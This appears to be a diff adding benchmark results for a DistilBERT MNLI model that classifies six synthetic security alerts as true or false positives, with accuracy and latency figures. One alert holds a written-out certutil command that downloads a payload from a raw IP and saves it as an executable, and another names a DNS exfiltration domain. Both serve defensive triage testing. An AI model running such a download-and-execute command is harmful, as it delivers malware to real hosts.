@@ -1,0 +1,92 @@
+{
+  "model_id": "typeform/distilbert-base-uncased-mnli",
+  "parameter_count": 66955779,
+  "accuracy": 66.66666666666666,
+  "avg_latency_ms": 2011.1983333333335,
+  "results": [
+    {
+      "id": "CASE-1-MALWARE",
+      "type": "EDR Alert",
+      "description": "Suspicious execution: certutil.exe -urlcache -split -f http://185.220.101.5/payload.bin payload.exe initiated by unknown parent process on ws-eng-402.",
+      "expected": "likely_true_positive",
+      "classification": "likely_true_positive",
+      "category": "c2_exfiltration",
+      "category_confidence": 0.396,
+      "p_malicious": 0.994,
+      "p_approved": 0.0,
+      "escalate_to_system2": true,
+      "latency_ms": 2648.46,
+      "match": true
+    },
+    {
+      "id": "CASE-2-BRUTE-FORCE",
+      "type": "Authentication",
+      "description": "Multiple failed Kerberos pre-authentication requests (Event 4625 sub-status 0xC000006A) targeting user charlie.admin from IP 185.220.101.5 followed by logon success.",
+      "expected": "likely_true_positive",
+      "classification": "likely_true_positive",
+      "category": "c2_exfiltration",
+      "category_confidence": 0.543,
+      "p_malicious": 0.908,
+      "p_approved": 0.0,
+      "escalate_to_system2": true,
+      "latency_ms": 1882.18,
+      "match": true
+    },
+    {
+      "id": "CASE-3-C2-TUNNEL",
+      "type": "Network Flow",
+      "description": "High entropy outbound DNS queries to nameserver ns1.evil-domain.ru transferring 850KB of base64 encoded chunks.",
+      "expected": "likely_true_positive",
+      "classification": "likely_true_positive",
+      "category": "c2_exfiltration",
+      "category_confidence": 0.332,
+      "p_malicious": 0.708,
+      "p_approved": 0.001,
+      "escalate_to_system2": true,
+      "latency_ms": 2151.2,
+      "match": true
+    },
+    {
+      "id": "CASE-4-NESSUS-SCAN",
+      "type": "Network Scan",
+      "description": "Routine scheduled Nessus vulnerability assessment scanner 10.0.1.15 sweeping internal development subnet across TCP ports 80, 443, 8080.",
+      "expected": "likely_false_positive",
+      "classification": "likely_false_positive",
+      "category": "network_recon",
+      "category_confidence": 0.459,
+      "p_malicious": 0.744,
+      "p_approved": 0.957,
+      "escalate_to_system2": false,
+      "latency_ms": 1868.02,
+      "match": true
+    },
+    {
+      "id": "CASE-5-BACKUP-SERVICE",
+      "type": "Process Execution",
+      "description": "VeeamAgent.exe volume snapshot shadow copy creation during scheduled midnight enterprise database backup on db-prod-02.",
+      "expected": "likely_false_positive",
+      "classification": "likely_true_positive",
+      "category": "network_recon",
+      "category_confidence": 0.407,
+      "p_malicious": 0.633,
+      "p_approved": 0.055,
+      "escalate_to_system2": true,
+      "latency_ms": 1914.9,
+      "match": false
+    },
+    {
+      "id": "CASE-6-USER-TYPO",
+      "type": "Authentication",
+      "description": "Single bad password attempt for alice.smith from corporate workstation ws-hr-104 followed immediately by successful MFA verification.",
+      "expected": "likely_false_positive",
+      "classification": "likely_true_positive",
+      "category": "c2_exfiltration",
+      "category_confidence": 0.293,
+      "p_malicious": 0.559,
+      "p_approved": 0.0,
+      "escalate_to_system2": true,
+      "latency_ms": 1602.43,
+      "match": false
+    }
+  ]
+}
